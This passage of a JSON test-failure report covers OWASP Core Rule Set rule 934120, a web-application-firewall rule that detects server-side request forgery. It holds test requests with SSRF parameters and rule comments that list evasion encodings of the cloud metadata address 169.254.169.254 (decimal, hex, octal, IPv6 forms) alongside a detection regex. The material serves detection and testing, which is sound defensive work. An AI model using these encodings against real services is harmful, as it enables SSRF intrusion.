          "action_type" : "block"
        }, {
          "type" : "Action",
          "action_type" : "capture"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "none"
        }, {
          "type" : "Action",
          "action_type" : "msg",
          "value" : "Possible Server Side Request Forgery (SSRF) Attack: URL Parameter using IP Address"
        }, {
          "type" : "Action",
          "action_type" : "log_data",
          "value" : "Matched Data: %{TX.0} found within %{MATCHED_VAR_NAME}: %{MATCHED_VAR}"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "application-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "language-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "platform-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "attack-ssrf"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "paranoia-level/2"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS/ATTACK-GENERIC"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "capec/1000/225/664"
        }, {
          "type" : "Action",
          "action_type" : "ver",
          "value" : "OWASP_CRS/4.22.0-dev"
        }, {
          "type" : "Action",
          "action_type" : "severity",
          "value" : "Critical"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.rce_score=+%{tx.critical_anomaly_score}"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.inbound_anomaly_score_pl2=+%{tx.critical_anomaly_score}"
        } ]
      }
    }
  }, {
    "test_rule" : "934120",
    "test_id" : 25,
    "test_path" : "REQUEST-934-APPLICATION-ATTACK-GENERIC/934120.yaml",
    "description" : "SSRF - Enclosed alphanumerics 3 - text",
    "cause" : "failed expect_id check: 934120 not found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ "phase=2 rule_id=920250 - UTF8 Encoding Abuse Attack Attempt", "phase=2 rule_id=920272 - Invalid character in request (outside of printable chars below ascii 127)", "phase=2 rule_id=920272 - Invalid character in request (outside of printable chars below ascii 127)", "phase=2 rule_id=920273 - Invalid character in request (outside of very strict set)", "phase=2 rule_id=931130 - Possible Remote File Inclusion (RFI) Attack: Off-Domain Reference/Link", "phase=2 rule_id=942460 - Meta-Character Anomaly Detection Alert - Repetitive Non-Word Characters" ]
    },
    "test" : {
      "test_id" : 25,
      "desc" : "SSRF - Enclosed alphanumerics 3 - text",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "port" : 80,
          "headers" : {
            "Host" : "localhost",
            "User-Agent" : "OWASP CRS test agent",
            "Accept" : "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",
            "Accept-Encoding" : "gzip,deflate",
            "Accept-Language" : "en-us,en;q=0.5"
          },
          "method" : "GET",
          "uri" : "/get?ssrf=irc://",
          "version" : "HTTP/1.1"
        },
        "output" : {
          "log" : {
            "expect_ids" : [ 934120 ]
          }
        }
      } ]
    },
    "tested_rule" : {
      "type" : "SecRule",
      "id" : 934120,
      "phase" : 2,
      "chain" : false,
      "comment_block" : {
        "type" : "CommentBlock",
        "comments" : [ {
          "type" : "Comment",
          "text" : " -=[ SSRF Attacks ]=-"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " PL2 rules adds SSRF capture for common evasion techniques."
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " We add captures for these evasion techniques: (see source in util/regexp-assemble/data/regexp-934120.data)"
        }, {
          "type" : "Comment",
          "text" : " http://425.510.425.510/ Dotted decimal with overflow (already covered by RFI rule 931100)"
        }, {
          "type" : "Comment",
          "text" : " http://2852039166/ Dotless decimal - \\d{10}"
        }, {
          "type" : "Comment",
          "text" : " http://7147006462/ Dotless decimal with overflow - \\d{10}"
        }, {
          "type" : "Comment",
          "text" : " http://0xA9.0xFE.0xA9.0xFE/ Dotted hexadecimal - (?:0x[a-f0-9]{2}\\.){3}0x[a-f0-9]{2}"
        }, {
          "type" : "Comment",
          "text" : " http://0xA9FEA9FE/ Dotless hexadecimal - 0x[a-f0-9]{8}"
        }, {
          "type" : "Comment",
          "text" : " http://0x41414141A9FEA9FE/ Dotless hexadecimal with overflow - 0x[a-f0-9]{16}"
        }, {
          "type" : "Comment",
          "text" : " http://0251.0376.0251.0376/ Dotted octal - Covered by the same below"
        }, {
          "type" : "Comment",
          "text" : " http://0251.00376.000251.0000376/ Dotted octal with padding - (?:0{1,4}\\d{3}\\.){3}0{1,4}\\d{3})"
        }, {
          "type" : "Comment",
          "text" : " http://169.254.43518/ - (?:\\d{1,3}\\.){2}\\.\\d{5}"
        }, {
          "type" : "Comment",
          "text" : " http://169.16689662/ - \\d{1,3}\\.\\d{8}"
        }, {
          "type" : "Comment",
          "text" : " http://[::ffff:a9fe:a9fe] IPV6 Compressed - IPv6 regex from https://ihateregex.io/expr/ipv6/, with [0-9] converted to \\d and with non-capturing groups (below)"
        }, {
          "type" : "Comment",
          "text" : " http://[0:0:0:0:0:ffff:a9fe:a9fe] IPV6 Expanded -  (?:(?:[0-9a-fA-F]{1,4}:){7}[0-9a-fA-F]{1,4}|(?:[0-9a-fA-F]{1,4}:){1,7}:|(?:[0-9a-fA-F]{1,4}:){1,6}:[0-9a-fA-F]{1,4}|(?:[0-9a-fA-F]{1,4}:){1,5}(:[0-9a-fA-F]{1,4}){1,2}|(?:[0-9a-fA-F]{1,4}:){1,4}(:[0-9a-fA-F]{1,4}){1,3}|(?:[0-9a-fA-F]{1,4}:){1,3}(?::[0-9a-fA-F]{1,4}){1,4}|(?:[0-9a-fA-F]{1,4}:){1,2}(?::[0-9a-fA-F]{1,4}){1,5}|[0-9a-fA-F]{1,4}:(?:(?::[0-9a-fA-F]{1,4}){1,6})|:(?:(?::[0-9a-fA-F]{1,4}){1,7}|:)|fe80:(?::[0-9a-fA-F]{0,4}){0,4}%[0-9a-zA-Z]{1,}|::(ffff(?::0{1,4}){0,1}:){0,1}(?:(?:25[0-5]|(?:2[0-4]|1{0,1}\\d){0,1}\\d)\\.){3,3}(?:25[0-5]|(?:2[0-4]|1{0,1}\\d){0,1}\\d)|(?:[0-9a-fA-F]{1,4}:){1,4}:(?:(?:25[0-5]|(2[0-4]|1{0,1}\\d){0,1}\\d)\\.){3,3}(?:25[0-5]|(?:2[0-4]|1{0,1}\\d){0,1}\\d))"
        }, {
          "type" : "Comment",
          "text" : " http://[0:0:0:0:0:ffff:169.254.169.254] IPV6/IPV4 - ((?:[0-9a-fA-F]{1,4}:){6}(?:(25[0-5]|(?:2[0-4]|1{0,1}\\d){0,1}\\d)\\.){3,3}(?:25[0-5]|(?:2[0-4]|1{0,1}\\d){0,1}\\d))"
        }, {
          "type" : "Comment",
          "text" : " http://[::]"
        }, {
          "type" : "Comment",
          "text" : " http://127.88.23.245:22/+&@google.com:80#+@google.com:80/ (already covered by RFI rule 931100)"
        }, {
          "type" : "Comment",
          "text" : " http://127.88.23.245:22/?@google.com:80/ (already covered by RFI rule 931100)"
        }, {
          "type" : "Comment",
          "text" : " http://127.88.23.245:22/#@www.google.com:80/ (already covered by RFI rule 931100)"
        }, {
          "type" : "Comment",
          "text" : " http://google.com:80\\\\@127.88.23.245:22/ (already covered by RFI rule 931100)"
        }, {
          "type" : "Comment",
          "text" : " http://google.com:80+&@127.88.23.245:22/#+@google.com:80/"
        }, {
          "type" : "Comment",
          "text" : " http://google.com:80+&@google.com:80#+@127.88.23.245:22/"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Regular expression generated from regex-assembly/934120.ra."
        }, {
          "type" : "Comment",
          "text" : " To update the regular expression run the following shell script"
        }, {
          "type" : "Comment",
          "text" : " (consult https://coreruleset.org/docs/development/regex_assembly/ for details):"
        }, {
          "type" : "Comment",
          "text" : "   crs-toolchain regex update 934120"
        }, {
          "type" : "Comment",
          "text" : ""
        } ]
      },
      "variables" : {
        "type" : "Variables",
        "negated" : true,
        "count" : false,
        "variables" : [ {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES_NAMES",
          "key" : null
        }, {
          "type" : "SimpleVariable",
          "name" : "REQUEST_FILENAME"
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "/*"
        } ],
        "negated_variables" : [ ]
      },
      "operator" : {
        "type" : "Operator",
        "operator_type" : "rx",
        "pattern" : "(?i)(?:a(?:cap|f[ps]|ttachment)|b(?:eshare|itcoin|lob)|c(?:a(?:llto|p)|id|vs|ompress.(?:zlib|bzip2))|d(?:a(?:v|ta)|ict|n(?:s|tp))|e(?:d2k|xpect)|f(?:(?:ee)?d|i(?:le|nger|sh)|tps?)|g(?:it|o(?:pher)?|lob)|h(?:323|ttps?)|i(?:ax|cap|(?:ma|p)ps?|rc[6s]?)|ja(?:bbe)?r|l(?:dap[is]?|ocal_file)|m(?:a(?:ilto|ven)|ms|umble)|n(?:e(?:tdoc|ws)|fs|ntps?)|ogg|p(?:aparazzi|h(?:ar|p)|op(?:2|3s?)|r(?:es|oxy)|syc)|r(?:mi|sync|tm(?:f?p)?|ar)|s(?:3|ftp|ips?|m(?:[bs]|tps?)|n(?:ews|mp)|sh(?:2(?:.(?:s(?:hell|(?:ft|c)p)|exec|tunnel))?)?|vn(?:\\+ssh)?)|t(?:e(?:amspeak|lnet)|ftp|urns?)|u(?:dp|nreal|t2004)|v(?:entrilo|iew-source|nc)|w(?:ebcal|ss?)|x(?:mpp|ri)|zip)://(?:[0-9]{10}|(?:0x[0-9a-f]{2}\\.){3}0x[0-9a-f]{2}|0x(?:[0-9a-f]{8}|[0-9a-f]{16})|(?:0{1,4}[0-9]{1,3}\\.){3}0{1,4}[0-9]{1,3}|[0-9]{1,3}\\.(?:[0-9]{1,3}\\.[0-9]{5}|[0-9]{8})|(?:\\x5c\\x5c[\\-0-9a-z]\\.?_?)+|\\[[0-:a-f]+(?:[\\.0-9]+|%[0-9A-Z_a-z]+)?\\]|[a-z][\\-\\.0-9A-Z_a-z]{1,255}:[0-9]{1,5}(?:#?[\\s\\x0b]*&?@(?:(?:[0-9]{1,3}\\.){3}[0-9]{1,3}|[a-z][\\-\\.0-9A-Z_a-z]{1,255}):[0-9]{1,5}/?)+|[\\.0-9]{0,11}(?:\\x{e2}(?:\\x91[\\xa0-\\x{bf}]|\\x92[\\x80-\\x{bf}]|\\x93[\\x80-\\x{a9}\\x{ab}-\\x{bf}])|\\x{e3}\\x80\\x82)+)"
      },
      "actions" : {
        "type" : "Actions",
        "actions" : [ {
          "type" : "Action",
          "action_type" : "id",
          "value" : 934120
        }, {
          "type" : "Action",
          "action_type" : "phase",
          "value" : 2
        }, {
          "type" : "Action",
          "action_type" : "block"
        }, {
          "type" : "Action",
          "action_type" : "capture"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "none"
        }, {
          "type" : "Action",
          "action_type" : "msg",
          "value" : "Possible Server Side Request Forgery (SSRF) Attack: URL Parameter using IP Address"
        }, {
          "type" : "Action",
          "action_type" : "log_data",
          "value" : "Matched Data: %{TX.0} found within %{MATCHED_VAR_NAME}: %{MATCHED_VAR}"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "application-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "language-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "platform-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "attack-ssrf"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "paranoia-level/2"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS/ATTACK-GENERIC"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "capec/1000/225/664"
        }, {
          "type" : "Action",
          "action_type" : "ver",
          "value" : "OWASP_CRS/4.22.0-dev"
        }, {
          "type" : "Action",
          "action_type" : "severity",
          "value" : "Critical"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.rce_score=+%{tx.critical_anomaly_score}"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.inbound_anomaly_score_pl2=+%{tx.critical_anomaly_score}"
        } ]
      }
    }
  }, {
    "test_rule" : "934120",
    "test_id" : 26,
    "test_path" : "REQUEST-934-APPLICATION-ATTACK-GENERIC/934120.yaml",
    "description" : "SSRF - Enclosed alphanumerics 3 - text",
    "cause" : "failed expect_id check: 934120 not found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ "phase=2 rule_id=920250 - UTF8 Encoding Abuse Attack Attempt", "phase=2 rule_id=920272 - Invalid character in request (outside of printable chars below ascii 127)", "phase=2 rule_id=920272 - Invalid character in request (outside of printable chars below ascii 127)", "phase=2 rule_id=920273 - Invalid character in request (outside of very strict set)", "phase=2 rule_id=931130 - Possible Remote File Inclusion (RFI) Attack: Off-Domain Reference/Link", "phase=2 rule_id=942460 - Meta-Character Anomaly Detection Alert - Repetitive Non-Word Characters" ]
    },
    "test" : {
      "test_id" : 26,
      "desc" : "SSRF - Enclosed alphanumerics 3 - text",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "port" : 80,
          "headers" : {
            "Host" : "localhost",
            "User-Agent" : "OWASP CRS test agent",
            "Accept" : "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",
            "Accept-Encoding" : "gzip,deflate",
            "Accept-Language" : "en-us,en;q=0.5"
          },
          "method" : "GET",
          "uri" : "/get?ssrf=pop3://",
          "version" : "HTTP/1.1"
        },
        "output" : {
          "log" : {
            "expect_ids" : [ 934120 ]
          }
        }
      } ]
    },
    "tested_rule" : {
      "type" : "SecRule",
      "id" : 934120,
      "phase" : 2,
      "chain" : false,
      "comment_block" : {
        "type" : "CommentBlock",
        "comments" : [ {
          "type" : "Comment",
          "text" : " -=[ SSRF Attacks ]=-"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " PL2 rules adds SSRF capture for common evasion techniques."
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " We add captures for these evasion techniques: (see source in util/regexp-assemble/data/regexp-934120.data)"
        }, {
          "type" : "Comment",
          "text" : " http://425.510.425.510/ Dotted decimal with overflow (already covered by RFI rule 931100)"
        }, {
          "type" : "Comment",
          "text" : " http://2852039166/ Dotless decimal - \\d{10}"
        }, {
          "type" : "Comment",
          "text" : " http://7147006462/ Dotless decimal with overflow - \\d{10}"
        }, {
          "type" : "Comment",
          "text" : " http://0xA9.0xFE.0xA9.0xFE/ Dotted hexadecimal - (?:0x[a-f0-9]{2}\\.){3}0x[a-f0-9]{2}"
        }, {
          "type" : "Comment",
          "text" : " http://0xA9FEA9FE/ Dotless hexadecimal - 0x[a-f0-9]{8}"
        }, {
          "type" : "Comment",
          "text" : " http://0x41414141A9FEA9FE/ Dotless hexadecimal with overflow - 0x[a-f0-9]{16}"
        }, {
          "type" : "Comment",
          "text" : " http://0251.0376.0251.0376/ Dotted octal - Covered by the same below"
        }, {
          "type" : "Comment",
          "text" : " http://0251.00376.000251.0000376/ Dotted octal with padding - (?:0{1,4}\\d{3}\\.){3}0{1,4}\\d{3})"
        }, {
          "type" : "Comment",
          "text" : " http://169.254.43518/ - (?:\\d{1,3}\\.){2}\\.\\d{5}"
        }, {
          "type" : "Comment",
          "text" : " http://169.16689662/ - \\d{1,3}\\.\\d{8}"
        }, {
          "type" : "Comment",
          "text" : " http://[::ffff:a9fe:a9fe] IPV6 Compressed - IPv6 regex from https://ihateregex.io/expr/ipv6/, with [0-9] converted to \\d and with non-capturing groups (below)"
        }, {
          "type" : "Comment",
          "text" : " http://[0:0:0:0:0:ffff:a9fe:a9fe] IPV6 Expanded -  (?:(?:[0-9a-fA-F]{1,4}:){7}[0-9a-fA-F]{1,4}|(?:[0-9a-fA-F]{1,4}:){1,7}:|(?:[0-9a-fA-F]{1,4}:){1,6}:[0-9a-fA-F]{1,4}|(?:[0-9a-fA-F]{1,4}:){1,5}(:[0-9a-fA-F]{1,4}){1,2}|(?:[0-9a-fA-F]{1,4}:){1,4}(:[0-9a-fA-F]{1,4}){1,3}|(?:[0-9a-fA-F]{1,4}:){1,3}(?::[0-9a-fA-F]{1,4}){1,4}|(?:[0-9a-fA-F]{1,4}:){1,2}(?::[0-9a-fA-F]{1,4}){1,5}|[0-9a-fA-F]{1,4}:(?:(?::[0-9a-fA-F]{1,4}){1,6})|:(?:(?::[0-9a-fA-F]{1,4}){1,7}|:)|fe80:(?::[0-9a-fA-F]{0,4}){0,4}%[0-9a-zA-Z]{1,}|::(ffff(?::0{1,4}){0,1}:){0,1}(?:(?:25[0-5]|(?:2[0-4]|1{0,1}\\d){0,1}\\d)\\.){3,3}(?:25[0-5]|(?:2[0-4]|1{0,1}\\d){0,1}\\d)|(?:[0-9a-fA-F]{1,4}:){1,4}:(?:(?:25[0-5]|(2[0-4]|1{0,1}\\d){0,1}\\d)\\.){3,3}(?:25[0-5]|(?:2[0-4]|1{0,1}\\d){0,1}\\d))"
        }, {
          "type" : "Comment",
          "text" : " http://[0:0:0:0:0:ffff:169.254.169.254] IPV6/IPV4 - ((?:[0-9a-fA-F]{1,4}:){6}(?:(25[0-5]|(?:2[0-4]|1{0,1}\\d){0,1}\\d)\\.){3,3}(?:25[0-5]|(?:2[0-4]|1{0,1}\\d){0,1}\\d))"
        }, {
          "type" : "Comment",
          "text" : " http://[::]"
        }, {
          "type" : "Comment",
          "text" : " http://127.88.23.245:22/+&@google.com:80#+@google.com:80/ (already covered by RFI rule 931100)"
        }, {
          "type" : "Comment",
          "text" : " http://127.88.23.245:22/?@google.com:80/ (already covered by RFI rule 931100)"
        }, {
          "type" : "Comment",
          "text" : " http://127.88.23.245:22/#@www.google.com:80/ (already covered by RFI rule 931100)"
        }, {
          "type" : "Comment",
          "text" : " http://google.com:80\\\\@127.88.23.245:22/ (already covered by RFI rule 931100)"
        }, {
          "type" : "Comment",
          "text" : " http://google.com:80+&@127.88.23.245:22/#+@google.com:80/"
        }, {
          "type" : "Comment",
          "text" : " http://google.com:80+&@google.com:80#+@127.88.23.245:22/"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Regular expression generated from regex-assembly/934120.ra."
        }, {
          "type" : "Comment",
          "text" : " To update the regular expression run the following shell script"
        }, {
          "type" : "Comment",
          "text" : " (consult https://coreruleset.org/docs/development/regex_assembly/ for details):"
        }, {
          "type" : "Comment",
          "text" : "   crs-toolchain regex update 934120"
        }, {
          "type" : "Comment",
          "text" : ""
        } ]
      },
      "variables" : {
        "type" : "Variables",
        "negated" : true,
        "count" : false,
        "variables" : [ {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES_NAMES",
          "key" : null
        }, {
          "type" : "SimpleVariable",
          "name" : "REQUEST_FILENAME"
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "/*"
        } ],
        "negated_variables" : [ ]
      },
      "operator" : {
        "type" : "Operator",
        "operator_type" : "rx",
        "pattern" : "(?i)(?:a(?:cap|f[ps]|ttachment)|b(?:eshare|itcoin|lob)|c(?:a(?:llto|p)|id|vs|ompress.(?:zlib|bzip2))|d(?:a(?:v|ta)|ict|n(?:s|tp))|e(?:d2k|xpect)|f(?:(?:ee)?d|i(?:le|nger|sh)|tps?)|g(?:it|o(?:pher)?|lob)|h(?:323|ttps?)|i(?:ax|cap|(?:ma|p)ps?|rc[6s]?)|ja(?:bbe)?r|l(?:dap[is]?|ocal_file)|m(?:a(?:ilto|ven)|ms|umble)|n(?:e(?:tdoc|ws)|fs|ntps?)|ogg|p(?:aparazzi|h(?:ar|p)|op(?:2|3s?)|r(?:es|oxy)|syc)|r(?:mi|sync|tm(?:f?p)?|ar)|s(?:3|ftp|ips?|m(?:[bs]|tps?)|n(?:ews|mp)|sh(?:2(?:.(?:s(?:hell|(?:ft|c)p)|exec|tunnel))?)?|vn(?:\\+ssh)?)|t(?:e(?:amspeak|lnet)|ftp|urns?)|u(?:dp|nreal|t2004)|v(?:entrilo|iew-source|nc)|w(?:ebcal|ss?)|x(?:mpp|ri)|zip)://(?:[0-9]{10}|(?:0x[0-9a-f]{2}\\.){3}0x[0-9a-f]{2}|0x(?:[0-9a-f]{8}|[0-9a-f]{16})|(?:0{1,4}[0-9]{1,3}\\.){3}0{1,4}[0-9]{1,3}|[0-9]{1,3}\\.(?:[0-9]{1,3}\\.[0-9]{5}|[0-9]{8})|(?:\\x5c\\x5c[\\-0-9a-z]\\.?_?)+|\\[[0-:a-f]+(?:[\\.0-9]+|%[0-9A-Z_a-z]+)?\\]|[a-z][\\-\\.0-9A-Z_a-z]{1,255}:[0-9]{1,5}(?:#?[\\s\\x0b]*&?@(?:(?:[0-9]{1,3}\\.){3}[0-9]{1,3}|[a-z][\\-\\.0-9A-Z_a-z]{1,255}):[0-9]{1,5}/?)+|[\\.0-9]{0,11}(?:\\x{e2}(?:\\x91[\\xa0-\\x{bf}]|\\x92[\\x80-\\x{bf}]|\\x93[\\x80-\\x{a9}\\x{ab}-\\x{bf}])|\\x{e3}\\x80\\x82)+)"
      },
      "actions" : {
        "type" : "Actions",
        "actions" : [ {
          "type" : "Action",
          "action_type" : "id",
          "value" : 934120
        }, {
          "type" : "Action",
          "action_type" : "phase",
          "value" : 2
        }, {
          "type" : "Action",
          "action_type" : "block"
        }, {
          "type" : "Action",
          "action_type" : "capture"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "none"
        }, {
          "type" : "Action",
          "action_type" : "msg",
          "value" : "Possible Server Side Request Forgery (SSRF) Attack: URL Parameter using IP Address"
        }, {
          "type" : "Action",
          "action_type" : "log_data",
          "value" : "Matched Data: %{TX.0} found within %{MATCHED_VAR_NAME}: %{MATCHED_VAR}"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "application-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "language-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "platform-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "attack-ssrf"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "paranoia-level/2"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS/ATTACK-GENERIC"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "capec/1000/225/664"
        }, {
          "type" : "Action",
          "action_type" : "ver",
          "value" : "OWASP_CRS/4.22.0-dev"
        }, {
          "type" : "Action",
          "action_type" : "severity",
          "value" : "Critical"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.rce_score=+%{tx.critical_anomaly_score}"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.inbound_anomaly_score_pl2=+%{tx.critical_anomaly_score}"
        } ]
      }
    }
  }, {
    "test_rule" : "934120",
    "test_id" : 33,
    "test_path" : "REQUEST-934-APPLICATION-ATTACK-GENERIC/934120.yaml",
    "description" : "SSRF - IPv6, link-local unicast with zone ID, compressed",
    "cause" : "failed expect_id check: 934120 not found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ "phase=2 rule_id=920272 - Invalid character in request (outside of printable chars below ascii 127)" ]
    },
    "test" : {
      "test_id" : 33,
      "desc" : "SSRF - IPv6, link-local unicast with zone ID, compressed",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "port" : 80,
          "headers" : {
            "Host" : "localhost",
            "User-Agent" : "OWASP CRS test agent",
            "Accept" : "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",
            "Accept-Encoding" : "gzip,deflate",
            "Accept-Language" : "en-us,en;q=0.5"
          },
          "method" : "GET",
          "uri" : "/get?ssrf=http://[fe80::%zone1]",
          "version" : "HTTP/1.1"
        },
        "output" : {
          "log" : {
            "expect_ids" : [ 934120 ]
          }
        }
      } ]
    },
    "tested_rule" : {
      "type" : "SecRule",
      "id" : 934120,
      "phase" : 2,
      "chain" : false,
      "comment_block" : {
        "type" : "CommentBlock",
        "comments" : [ {
          "type" : "Comment",
          "text" : " -=[ SSRF Attacks ]=-"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " PL2 rules adds SSRF capture for common evasion techniques."
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " We add captures for these evasion techniques: (see source in util/regexp-assemble/data/regexp-934120.data)"
        }, {
          "type" : "Comment",
          "text" : " http://425.510.425.510/ Dotted decimal with overflow (already covered by RFI rule 931100)"
        }, {
          "type" : "Comment",
          "text" : " http://2852039166/ Dotless decimal - \\d{10}"
        }, {
          "type" : "Comment",
          "text" : " http://7147006462/ Dotless decimal with overflow - \\d{10}"
        }, {
          "type" : "Comment",
          "text" : " http://0xA9.0xFE.0xA9.0xFE/ Dotted hexadecimal - (?:0x[a-f0-9]{2}\\.){3}0x[a-f0-9]{2}"
        }, {
          "type" : "Comment",
          "text" : " http://0xA9FEA9FE/ Dotless hexadecimal - 0x[a-f0-9]{8}"
        }, {
          "type" : "Comment",
          "text" : " http://0x41414141A9FEA9FE/ Dotless hexadecimal with overflow - 0x[a-f0-9]{16}"
        }, {
          "type" : "Comment",
          "text" : " http://0251.0376.0251.0376/ Dotted octal - Covered by the same below"
        }, {
          "type" : "Comment",
          "text" : " http://0251.00376.000251.0000376/ Dotted octal with padding - (?:0{1,4}\\d{3}\\.){3}0{1,4}\\d{3})"
        }, {
          "type" : "Comment",
          "text" : " http://169.254.43518/ - (?:\\d{1,3}\\.){2}\\.\\d{5}"
        }, {
          "type" : "Comment",
          "text" : " http://169.16689662/ - \\d{1,3}\\.\\d{8}"
        }, {
          "type" : "Comment",
          "text" : " http://[::ffff:a9fe:a9fe] IPV6 Compressed - IPv6 regex from https://ihateregex.io/expr/ipv6/, with [0-9] converted to \\d and with non-capturing groups (below)"
        }, {
          "type" : "Comment",
          "text" : " http://[0:0:0:0:0:ffff:a9fe:a9fe] IPV6 Expanded -  (?:(?:[0-9a-fA-F]{1,4}:){7}[0-9a-fA-F]{1,4}|(?:[0-9a-fA-F]{1,4}:){1,7}:|(?:[0-9a-fA-F]{1,4}:){1,6}:[0-9a-fA-F]{1,4}|(?:[0-9a-fA-F]{1,4}:){1,5}(:[0-9a-fA-F]{1,4}){1,2}|(?:[0-9a-fA-F]{1,4}:){1,4}(:[0-9a-fA-F]{1,4}){1,3}|(?:[0-9a-fA-F]{1,4}:){1,3}(?::[0-9a-fA-F]{1,4}){1,4}|(?:[0-9a-fA-F]{1,4}:){1,2}(?::[0-9a-fA-F]{1,4}){1,5}|[0-9a-fA-F]{1,4}:(?:(?::[0-9a-fA-F]{1,4}){1,6})|:(?:(?::[0-9a-fA-F]{1,4}){1,7}|:)|fe80:(?::[0-9a-fA-F]{0,4}){0,4}%[0-9a-zA-Z]{1,}|::(ffff(?::0{1,4}){0,1}:){0,1}(?:(?:25[0-5]|(?:2[0-4]|1{0,1}\\d){0,1}\\d)\\.){3,3}(?:25[0-5]|(?:2[0-4]|1{0,1}\\d){0,1}\\d)|(?:[0-9a-fA-F]{1,4}:){1,4}:(?:(?:25[0-5]|(2[0-4]|1{0,1}\\d){0,1}\\d)\\.){3,3}(?:25[0-5]|(?:2[0-4]|1{0,1}\\d){0,1}\\d))"
        }, {
          "type" : "Comment",
          "text" : " http://[0:0:0:0:0:ffff:169.254.169.254] IPV6/IPV4 - ((?:[0-9a-fA-F]{1,4}:){6}(?:(25[0-5]|(?:2[0-4]|1{0,1}\\d){0,1}\\d)\\.){3,3}(?:25[0-5]|(?:2[0-4]|1{0,1}\\d){0,1}\\d))"
        }, {
          "type" : "Comment",
          "text" : " http://[::]"
        }, {
          "type" : "Comment",
          "text" : " http://127.88.23.245:22/+&@google.com:80#+@google.com:80/ (already covered by RFI rule 931100)"
        }, {
          "type" : "Comment",
          "text" : " http://127.88.23.245:22/?@google.com:80/ (already covered by RFI rule 931100)"
        }, {
          "type" : "Comment",
          "text" : " http://127.88.23.245:22/#@www.google.com:80/ (already covered by RFI rule 931100)"
        }, {
          "type" : "Comment",
          "text" : " http://google.com:80\\\\@127.88.23.245:22/ (already covered by RFI rule 931100)"
        }, {
          "type" : "Comment",
          "text" : " http://google.com:80+&@127.88.23.245:22/#+@google.com:80/"
        }, {
          "type" : "Comment",
          "text" : " http://google.com:80+&@google.com:80#+@127.88.23.245:22/"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Regular expression generated from regex-assembly/934120.ra."
        }, {
          "type" : "Comment",
          "text" : " To update the regular expression run the following shell script"
        }, {
          "type" : "Comment",
